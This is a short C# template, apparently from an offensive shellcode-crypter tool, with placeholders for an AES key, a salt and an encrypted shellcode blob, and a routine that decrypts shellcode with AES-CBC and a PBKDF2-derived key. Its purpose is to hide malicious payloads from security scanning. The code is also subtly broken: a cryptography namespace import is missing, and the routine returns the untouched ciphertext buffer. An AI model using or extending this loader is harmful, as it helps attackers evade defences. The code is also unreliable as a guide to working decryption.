// c# decryption routine
// https://github.com/skahwah
//C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:FILENAME_TEMPLATE.exe FILENAME_TEMPLATE.cs

using System;
using System.IO;
using System.Text;

namespace Program
{
    class Program
    {
        
        static void Main(string[] args)
        {   

            byte[] passwordBytes = new byte[] AES_KEY_TEMPLATE
            byte[] saltBytes = new byte[] AES_SALT_TEMPLATE
            SHELLCODE_TEMPLATE
          
        }

        static byte[] DecryptShellcode(byte[] passwordBytes, byte[] saltBytes, byte[] shellcode)
        {
            byte[] decryptedString;
           
            RijndaelManaged rj = new RijndaelManaged();

            try
            {
                rj.KeySize = 256;
                rj.BlockSize = 128;
                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                rj.Key = key.GetBytes(rj.KeySize / 8);
                rj.IV = key.GetBytes(rj.BlockSize / 8);
                rj.Mode = CipherMode.CBC;

                MemoryStream ms = new MemoryStream(shellcode);

                using (CryptoStream cs = new CryptoStream(ms, rj.CreateDecryptor(), CryptoStreamMode.Read))
                {
                    cs.Read(shellcode, 0, shellcode.Length);
                    decryptedString = ms.ToArray();
                }
            }
            finally
            {
                rj.Clear();
            }

            return decryptedString;
        }
    }
}